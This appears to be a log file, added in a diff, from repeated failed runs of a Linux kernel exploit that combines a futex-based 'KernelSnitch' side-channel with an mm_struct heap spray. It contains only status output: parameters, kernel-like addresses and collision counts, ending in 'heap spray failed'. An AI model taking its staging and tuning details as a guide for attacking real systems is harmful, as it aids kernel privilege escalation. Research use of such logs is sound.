+[31m[-] [0mprepare_kernel_page retry 20/24
+[33m[*] [0mKernelSnitch setup: cpus=8 mm_per_slab=34 prep=1088 spray=204 pre=33 post=34
+[33m[*] [0mparameters cpu (16) mm_struct sz (3c0) mm slab order (3) thread cnt (8) collisions (16) mte disabled
+[33m[*] [0mKernelSnitch parameters: threads=8 collisions=16 futexes=262144 identity_step=0x40000000
+[33m[*] [0mstart finding collisisons
+[33m[*] [0mtarget    0000007b968710c8
+[33m[*] [0m  0000006b95e84018[33m[*] [0m  0000006b95e87030[33m[*] [0m  0000006b95f93890[33m[*] [0m  0000006b95fa1900[33m[*] [0m  0000006b95fb0978[33m[*] [0m  0000006b96029d40[33m[*] [0m  0000006b9602ad48[33m[*] [0m  0000006b9607afc8[33m[*] [0m  0000006b960c01f8[33m[*] [0m  0000006b960dd2e0[33m[*] [0m  0000006b960e9340[33m[*] [0m  0000006b96114498[33m[*] [0m  0000006b9612f570[33m[*] [0m  0000006b9618e868[33m[*] [0m  0000006b9619a8c8[33m[*] [0mfound 15 collisisons
+[31m[-] [0monly found 15 collisions -> cannot continue
+[33m[*] [0m[p1] spray: pre/post mms killed, waiting leak child[33m[*] [0mKernelSnitch collisions: not found
+[31m[-] [0mKernelSnitch collision finding failed
+[31m[-] [0m[detected] assert((ks->state == KERNELSNITCH_MM_FOUND || ks->state == KERNELSNITCH_MM_NOT_FOUND)): wrong state
+[33m[*] [0mdone
+[31m[-] [0mprepare_kernel_page retry 21/24
+[33m[*] [0mKernelSnitch setup: cpus=8 mm_per_slab=34 prep=1088 spray=204 pre=33 post=34
+[33m[*] [0mparameters cpu (16) mm_struct sz (3c0) mm slab order (3) thread cnt (8) collisions (16) mte disabled
+[33m[*] [0mKernelSnitch parameters: threads=8 collisions=16 futexes=262144 identity_step=0x40000000
+[33m[*] [0mstart finding collisisons
+[33m[*] [0mtarget    0000007b968710c8
+[33m[*] [0m  0000006b95f6a748[33m[*] [0m  0000006b95f86828[33m[*] [0m  0000006b95fc6a28[33m[*] [0m  0000006b96094098[33m[*] [0m  0000006b96193890[33m[*] [0m  0000006b961dfaf0[33m[*] [0m  0000006b96225d20[33m[*] [0m  0000006b962c8238[33m[*] [0m  0000006b96364718[33m[*] [0m  0000006b96390878[33m[*] [0m  0000006b9639e8e8[33m[*] [0m  0000006b96406c28[33m[*] [0m  0000006b9641fcf0[33m[*] [0m  0000006b96425d20[33m[*] [0m  0000006b96478fb8[33m[*] [0mfound 15 collisisons
+[31m[-] [0monly found 15 collisions -> cannot continue
+[33m[*] [0m[p1] spray: pre/post mms killed, waiting leak child[33m[*] [0mKernelSnitch collisions: not found
+[31m[-] [0mKernelSnitch collision finding failed
+[31m[-] [0m[detected] assert((ks->state == KERNELSNITCH_MM_FOUND || ks->state == KERNELSNITCH_MM_NOT_FOUND)): wrong state
+[33m[*] [0mdone
+[31m[-] [0mprepare_kernel_page retry 22/24
+[33m[*] [0mKernelSnitch setup: cpus=8 mm_per_slab=34 prep=1088 spray=204 pre=33 post=34
+[33m[*] [0mparameters cpu (16) mm_struct sz (3c0) mm slab order (3) thread cnt (8) collisions (16) mte disabled
+[33m[*] [0mKernelSnitch parameters: threads=8 collisions=16 futexes=262144 identity_step=0x40000000
+[33m[*] [0mstart finding collisisons
+[33m[*] [0mtarget    0000007b968710c8
+[33m[*] [0m  0000006b95f03410[33m[*] [0m  0000006b95f14498[33m[*] [0m  0000006b95f7b7d0[33m[*] [0m  0000006b95f91880[33m[*] [0m  0000006b96018cb8[33m[*] [0m  0000006b960d92c0[33m[*] [0m  0000006b961ba9c8[33m[*] [0m  0000006b961bc9d8[33m[*] [0m  0000006b961d1a80[33m[*] [0m  0000006b96239dc0[33m[*] [0m  0000006b96242e08[33m[*] [0m  0000006b9625bed0[33m[*] [0m  0000006b96260ef8[33m[*] [0m  0000006b96266f28[33m[*] [0m  0000006b96271f80[33m[*] [0mfound 15 collisisons
+[31m[-] [0monly found 15 collisions -> cannot continue
+[33m[*] [0m[p1] spray: pre/post mms killed, waiting leak child[33m[*] [0mKernelSnitch collisions: not found
+[31m[-] [0mKernelSnitch collision finding failed
+[31m[-] [0m[detected] assert((ks->state == KERNELSNITCH_MM_FOUND || ks->state == KERNELSNITCH_MM_NOT_FOUND)): wrong state
+[33m[*] [0mdone
+[31m[-] [0mprepare_kernel_page retry 23/24
+[33m[*] [0mKernelSnitch setup: cpus=8 mm_per_slab=34 prep=1088 spray=204 pre=33 post=34
+[33m[*] [0mparameters cpu (16) mm_struct sz (3c0) mm slab order (3) thread cnt (8) collisions (16) mte disabled
+[33m[*] [0mKernelSnitch parameters: threads=8 collisions=16 futexes=262144 identity_step=0x40000000
+[33m[*] [0mstart finding collisisons
+[33m[*] [0mtarget    0000007b968710c8
+[33m[*] [0m  0000006b95edc2d8[33m[*] [0m  0000006b96057eb0[33m[*] [0m  0000006b9609b0d0[33m[*] [0m  0000006b96133590[33m[*] [0m  0000006b961a2908[33m[*] [0m  0000006b961a6928[33m[*] [0m  0000006b961aa948[33m[*] [0m  0000006b961af970[33m[*] [0m  0000006b961ebb50[33m[*] [0m  0000006b9627fff0[33m[*] [0m  0000006b96283010[33m[*] [0m  0000006b96289040[33m[*] [0m  0000006b9629a0c8[33m[*] [0m  0000006b962a1100[33m[*] [0m  0000006b962a8138[33m[*] [0mfound 15 collisisons
+[31m[-] [0monly found 15 collisions -> cannot continue
+[33m[*] [0m[p1] spray: pre/post mms killed, waiting leak child[33m[*] [0mKernelSnitch collisions: not found
+[31m[-] [0mKernelSnitch collision finding failed
+[31m[-] [0m[detected] assert((ks->state == KERNELSNITCH_MM_FOUND || ks->state == KERNELSNITCH_MM_NOT_FOUND)): wrong state
+[33m[*] [0mdone
+[31m[-] [0mprepare_kernel_page retry 24/24
+[31m[!] [0m  heap spray failed
